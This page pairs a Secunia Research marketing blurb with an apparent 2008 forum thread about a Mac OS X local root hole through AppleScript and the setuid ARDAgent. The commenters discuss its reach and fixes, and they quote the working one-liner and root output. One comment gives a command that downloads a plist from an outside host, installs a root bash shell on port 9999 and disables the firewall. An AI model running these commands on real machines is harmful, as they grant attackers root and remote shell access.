How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

An anonymous reader writes *"Half the Mac OS X boxes in the world (confirmed on Mac OS X 10.4 Tiger and 10.5 Leopard) can be rooted through AppleScript: osascript -e 'tell app "ARDAgent" to do shell script "whoami"'; Works for normal users and admins, provided the normal user wasn't switched to via fast user switching. Secure? I think not."* On the other hand, since this exploit seems to require physical access to the machine to be rooted, you might have some other security concerns to deal with at that point, like keeping the intruder from raiding your fridge on his way out.

    Here's a non-destructive way to neutralize it.

    cd /System/Library/CoreServices/RemoteManagement/

    sudo tar -czf ARDAgent.app.gz ARDAgent.app

    sudo chmod 600 ARDAgent.app.gz

    This simply hides it in an unreadable tarball.

      Or more simply:

      chmod u-s /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/MacOS/ARDAgent

      After doing that, I get:

      patrick@picasso:~$ osascript -e 'tell app "ARDAgent" to do shell script "whoami"'
      patrick

      (Repairing permissions will probably reset this though.)

        No, GP was correct. On Mac OS X, ".app" means an application bundle ... which is a directory, not a file.

        If you try to gzip an application bundle without putting it in a tarball first, you'll just get a "foo.app/ is a directory; ignored" error.

        It's confusing because the Finder doesn't treat application bundles like normal directories, but that's what they are to the filesystem and \*nix utilities.

    The AppleScript requires an account to be logged in at the console. Granted, it's possible to also do that remotely, but you still need to have the console avilable via VNC etc.

                Ah, now I understand what you meant. I just SSH'd into a headless Mac Mini I have and tried it. It kicks out the message:

                > pebbles: ~ $ osascript -e 'tell app "ARDAgent" to do shell script "whoami"'
                > \_RegisterApplication(), FAILED TO establish the default connection to the WindowServer, \_CGSDefaultConnection() is NULL.

                Then after a timeout delay it returns with an error:

                > 23:47: execution error: ARDAgent got an error: Connection is invalid. (-609)

                So someone has to be logged into the Desktop at the same time the command is issued (even if issued remotely) and I'm guessing that the account the remote user is logged into probably has to be the same account the desktop user is using.

                So Xserve servers should be immune to this via SSH, unless someone else is actively using Remote Desktop at the same time. Interesting!

        A remote terminal session doesn't get you access to the OS X GUI, which is where AppleScript is found.

          True. But presumably you could write the script in any of the command-line editors and save it to the desktop or something, at which point the user could click on it.

          Not that it matters. If you have that level of access, you're already in a position to do more damage than what you could do through this exploit, by the sounds of it.

            The user wouldn't need to do anything. If you log in via SSH as a limited user, you could (theoretically) use OS X's "open" command to launch the file as if it was clicked, from anywhere in the filesystem. The catch is that your SSH login must be the current user of the Window Server (locally logged-in).

        No, again, you need the account you're using to be logged into the console, one way or another. If you are logged in as "gandalf" on the console, then you can run this script as "gandalf" over ssh, but not as "frodo."

    Yes, maybe a home computer doesn't have more people logging in. But:

    - Workstations at work have lots of people who can log into them. If I come really early or stay late, I can go to any workstation (and a few laptops) in the building and log in with my own account. If it's possible to escalate your rights from there, I could get access to everyone's local and temporary files.

      My even better question is: why is "bah, it requires physical access" seen as an automatic "don't worry about it" around these parts?...Workstations at work have lots of people who can log into them...Plus there are a lot of people who can physically get near any computer, up to CEO level. Like, say, the janitors.

      The reason that requiring physical access is seen as no big deal is because all that stuff you're worried about is something I can do without the need of any exploits.

      Got a machine with literally **any operating system**? All I need is to reboot the computer with a linux live cd (or usb thumb drive) and I get read / write access to everywhere. From there I can plant trojans, read your files, do whatever.

      Got a Linux machine? I can reboot and use grub to boot into single-user mode. There you go, I'm root. I can do all the of the above again.

      The only way to have any security at the physical level is with encryption. And when we see encryption exploits, we do get hyped up about it. Even with encryption, more security measures still need to be taken at the physical level. A physical keylogger between the keyboard and computer could be installed to discover typed passwords, etc.

      That said, an exploit is an exploit, and it should be treated as such. Physical-access only just means there's less to worry about.

  On the other hand, since this exploit seems to require physical access to the machine to be rooted, you might have some other security concerns to deal with at that point, like keeping the intruder from raiding your fridge on his way out.  Malware arguably (one of the greatest scourges of modern computing) spreads by just that, local root vulnerabilities (also known as 'standard procedure' in the Windows community). What makes this exploit so useless, given that all the perpetrator has to do is send it out to enough people hoping just a few will run it?

  It seems perfectly serious since one of the main security aspects of OS X is that root access is held sacred (as it should be) and malware is assumed to be 'stopped at the gate' by that policy.

    First, yes, this is a serious bug. It's a classic blunder, like getting into a land war in Asia, and is similar to the in NT3.51's scheduler to get LOCALSYSTEM rights, or the one in /bin/write in 2BSD to get a root shell.

    It's also easy to fix.

    And I am about 99 44/100 percent sure that there's more undiscovered holes like this in OS X, Windows Vista, and any random Linux desktop you could name.

    THe thing is, it's not true that "one of the main security aspects of OS X is that root access is held sacred (as it should be) and malware is assumed to be 'stopped at the gate' by that policy". It's not. You can protect the OS from the malware, but the malware can still hide, still restart itself after a reboot, and still destroy everything you actually CARE about without root access. And malware can similarly break out of Vista's jail around IE, and whatever APple does along those lines.

    Security is like sex. Once you're penetrated you're \*\*\*\*ed.

    The biggest advantage that Apple has is that Safari doesn't (any more) have a mechanism (at least not by default) to blithely execute outside a \*closed\* sandbox (not a leaky one) any random malware that can convince it that it's safe and trusted. That's the biggest security problem Windows has. ActiveX and all its kin. It's harder to penetrate OS X in the first place... you pretty much have to depend on social engineering... and people CAN learn not to be social-engineered.

      No, what's good about Linux, and to a slightly lesser extend OSX, is that Unix is an incredibly simple system at it's core, so there are relatively few possible exploitation vectors and they are all well understood.

            Given that:

            \* The answer should almost always be "no".
            \* It's less hassle if it doesn't ask, just doesn't do it.
            \* Users get trained to answer "yes", because they keep getting them.

            Any time you're putting up "Should I do something stupid" dialogs, you're making things easy for people who are trying to use social engineering to install malware.

            Here's the history of Apple's experiment with stupid security dialogs in Safari:

            They finally wised up, and removed the "doing something really stupid" bit, by turning off "open Safe files" by default.

            Microsoft's been in denial about the same thing since 1997.

            Windows is so much worse than everyone else that people tend to ignore it when Apple or KDE does something slightly less stupid than ActiveX, but it's still stupid, and putting up a "should this plane explode now?" dialog doesn't eliminate the stupidity.

    So let's not beat about the bush - ANY exploit that isn't fixed as quickly as possible is a problem because there's always at least one spotty teenager trying to become a HAX0R who is prepared to try his luck against some poor unwitting user. Agreed. That's probably why it was posted. I think if timothy thought this was nothing to care about, it wouldn't have been. :-)

    Suuure, it would be so easy to tell a "newbie Apple user" to go to Applications/Utilities/, start "Terminal" and then type something.

      I wasn't switched to via fastuserswitching, but I do lock my screen. that seems to have an impact on it, too.

      I ssh'd into my box at home and running this was successful.

      fwiw, osascript doesn't work if the user isn't logged into aqua. I've tried writing volume controller scripts and I tried scripting Unison and other applications and they don't work if you're not logged in physically at the machine.

      So basically, an exploit would need to be fired by the user or by something the user did (ie: surf to a website).

      This is interesting.

  This code could easily be wrapped into the preflight scripts for an Installer package in OS X, or integrated into any piece of malware to escalate itself to root without any user interaction beyond downloading it and launching it. In this sense, the arguments against the DNSChanger Trojan Horse of "it requires an admin password to be installed" becomes null and void. This is fairly serious, folks. One-click privilege escalation is way too easy for script-kiddies and professional malware distributers alike to integrate into their nasty programs.

  Firstly, I want to say I'm impressed.

  I'm not a Windows Fanatic or a MacEvangelist. I use both Windows and OSX and they both have strengths and weaknesses.

  I've seen waaay too many posts here and abroad about vulnerabilities in every OS out there. They are an unfortunate fact of life the IT Universe. However, too many times, when info is posted about Windows vulnerabilities MacEvangelists scream about how secure OSX is and and how Windows stinks. Conversely, when a vulnerability for OSX is posted, many of the same users write it off as a non-issue, too hard to execute, or some problem with the user's configs rather than an actual vulnerability.
  I have seen more than the normal number of folks, however, responding to this article with honesty about this exploit and even testing it further. (Let's just hope the underpaid Apple engineers [see other article about that] are listening).

  There are those here, though, who seem intent on writing this off as a non-exploit or trying to explain it away. That's where a concept known as "Intellectual Honesty" comes into play. You have to be honest with yourself about what you know and do. Viruses are a fact of life on computers and, while Apple is closed architecture (which by its very nature makes it MUCH more secure than other OSes), it's only a matter of time before real viruses appear for the Apple platform that just won't be able to be explained away.

  This article's exploit is a dangerous one to be sure and there are several equivalent Windows bugs. However, for all it's faults, Microsquash does a reasonable job of patching vulnerabilities carefully. Sometimes patching them right takes a little more time than users like, but the patches usually address the problems (although they do sometimes introduce more).

  Apple does an "okay" job of patching vulnerabilities, once they admit that they exist.

  There's another article about "carpet bombing" attacks via Safari and IE in Windows, and the responders there are perfect examples of the problems I refer to. A goodly number of them seem to be intent that the problem is Windows' fault and not a problem in Safari. Windows has issues, but the security problems exist in the program that's running and it's the programmer's duty to make sure that the APIs and such are called correctly and not in a manner to allow exploit to occure (too many programmers take easy shortcuts that introduce vulnerabilities).

  I hate to think it, but I will probably get the ever lovin' crap flamed out of me for saying all of this.

  Let me re-iterate. I'm impressed by a lot of the responders here with the unusually high level of Intellectual Honesty from Mac users than I have seen in the past. Let's hope the trend continues.

  p.s. I love the "security is like sex" comment above. Well put.

  Users noticed in October that Apple's built-in file system permissions verifier really wanted to delete the ARDAgent program (along with several others) because it was user-executable and setuid root. None of the users seemed to understand exactly what this meant...

  This may have come too late in the comments for anyone to see it, but if the exploit is active on your system, adding a key to ARDAgent's Info.plist makes the problem go away without disabling ARDAgent altogether. (Whether or not ARDAgent is a security vulnerability itself is another story.)

  > <key>NSAppleScriptEnabled</key>
  >  <string>YES</string>

  That "YES" is not a typo; setting it to "NO" does *not* fix the problem. AFAICT this makes osascript expect that ARDAgent will implement more of its own AppleScript handlers...which of course, it doesn't.

  P.S. I searched for other, similar problem setuid apps, and turned up check\_afp.app (which someone else posted already) and, surprisingly, GoogleUpdaterInstaller. Fortunately, even though these apps run setuid, they won't respond to the "do shell script" attack.

      Hmm, this works for me and is persistent across runs. Do this as an admin user:

      $ sudo defaults write /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Info NSAppleScriptEnabled YES
      $ sudo plutil -convert xml1 /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Info.plist
      $ sudo chmod 644 /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Info.plist

      The NSAppleScriptEnabled seems to force the use of the standard applescript dictionary which lacks the "do shell script" action. This is what you get when you try again:

      $ osascript -e 'tell app "ARDAgent" to do shell script "whoami"'
      23:47: execution error: ARDAgent got an error: "whoami" doesn't understand the do shell script message. (-1708)
      $ osascript -e 'tell app "ARDAgent" to do shell script "whoami"'
      23:47: execution error: ARDAgent got an error: "whoami" doesn't understand the do shell script message. (-1708)

    I might be misinterpreting you, so I apologize if I am. However, it sounds like you're saying that in order to have this code work, "Screen Sharing" needs to be enabled in the Sharing preferences. This is not true.

    Even as a normal user on my mac, the exploit code works.

    Other reply -- Medieval\_Gnome -- is absolutely correct. Unless you've DELETED by hand the Apple Remote Desktop files, the exploit works. I do not have ARD enabled, and the exploit works.

    My apologies. There was no article sourced in the posting and I couldn't recreate the exploit on any of the Macs in my house via SSH \*or\* with local physical access via Terminal.app. I kept getting:

    23:47: execution error: ARDAgent got an error: "whoami" doesn't understand the do shell script message. (-1708)

    No matter whether I tried ssh from remote, or local console bash.

    Tested on a MacBook Pro running 10.5.3, an iBook running 10.4.11 and a g5 PPC OS X Server running 10.4.11 (Server build).

    So....YMMV....

    Disconfirmed - I don't have (and never have had) Screen Sharing enabled on Leopard 10.5.3, and this exploit works perfectly.

     dan@Geelong:~$ ls -lh /etc/somefile
    ls: /etc/somefile: No such file or directory
    dan@Geelong:~$ osascript -e 'tell app "ARDAgent" to do shell script "touch /etc/somefile"'
    dan@Geelong:~$ ls -lh /etc/somefile
    -rw-rw-rw- 1 root wheel 0B Jun 18 14:16 /etc/somefile
    dan@Geelong:~$ osascript -e 'tell app "ARDAgent" to do shell script "rm /etc/somefile"'
    dan@Geelong:~$ ls -lh /etc/somefile
    ls: /etc/somefile: No such file or directory  So, how dangerous is this? Here's an example:

    osascript -e 'tell app "ARDAgent" to do shell script "cd /System/Library/LaunchDaemons ; curl -o bash.plist [http://cdslash.net/temp/bash.plist](http://cdslash.net/temp/bash.plist "cdslash.net") [cdslash.net] ; chmod 600 bash.plist ; launchctl load bash.plist ; launchctl start com.apple.bash ; ipfw disable firewall; launchctl "'

    This will download, install, load, and start a plist that provides an interactive bash shell on port 9999, and disables the ipfw firewall (Which is not enabled by default). If you run the above, you can 'nc localhost 9999' and find yourself at a root shell.

    To remove, run 'launchctl unload com.apple.bash' 'launchctl unload /System/Library/LaunchDaemons/bash.plist' and then 'rm /System/Library/LaunchDaemons/bash.plist'

    It should be noted that this service is accessible **even if the application firewall is enabled**. The only thing protecting the user at this point is their router firewall, if they have one, and that's easily bypassed with a Python script.

    So yeah; anything can be downloaded, and anything can be done with it. Scary.

      I don't think the GP was saying that you need to have Screen Sharing enabled for the exploit to work at all; you need to have Screen Sharing turned on for someone to run the exploit without *physical* access to the machine.

      I.e., you can't run it over an SSH session; you need the Finder. The only ways to get access to the Finder are either physically, by sitting down in front of the computer, or by using a screen-sharing application like Screen Sharing (Remote Desktop), or VNC.

      That was my understanding, at least.

      The exploit *works*, if you have physical access to the machine, regardless of whether you have Screen Sharing enabled or not. However, it's when you have Screen Sharing turned on that it's possibly a remote root to anyone you let access your screen.

      It's a bad vulnerability and one that I'd like to see Apple fix ASAP, but it's several steps down from a true unprivileged remote root. It might have negative consequences for shared and lab machines, but for most home and office users it doesn't seem like it means much, unless you typically allow lots of people remote-desktop/VNC access.

    This does not work over ssh, at least not if you user isn't also logged in physically to the machine. If you try over ssh, it gives the error

    However, it *does* work if you have a remote desktop view into a machine.

     Nope. You cannot do it via SSH unless that account is already logged in physically, at the console.

      *Time to run find(1) to see if there are any other things like this.*

      Assumptions:
      AppleScripting is only applicable to .app's
      "do shell script" is only a problem in the main binary, suid stuff in Resources/ isn't impacted.

      Results:

      > %sudo find /System/ -type f -ls | grep ' -rws' | grep MacOS | grep '\.app'
      > 365120 2864 -rwsr-xr-x 1 root wheel 1463076 Oct 17 2007 /System//Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/MacOS/ARDAgent

      Now, I have one of the machines where this exploit isn't working:

      > %osascript -e 'tell app "ARDAgent" to do shell script "whoami"'
      > 23:47: execution error: ARDAgent got an error: "whoami" doesn't understand the do shell script message. (-1708)

      So, somebody out there who can get it to work, see if:

      > %osascript -e 'tell app "check\_afp" to do shell script "whoami"'

      works or not. That might need full pathing, I'm not sure.
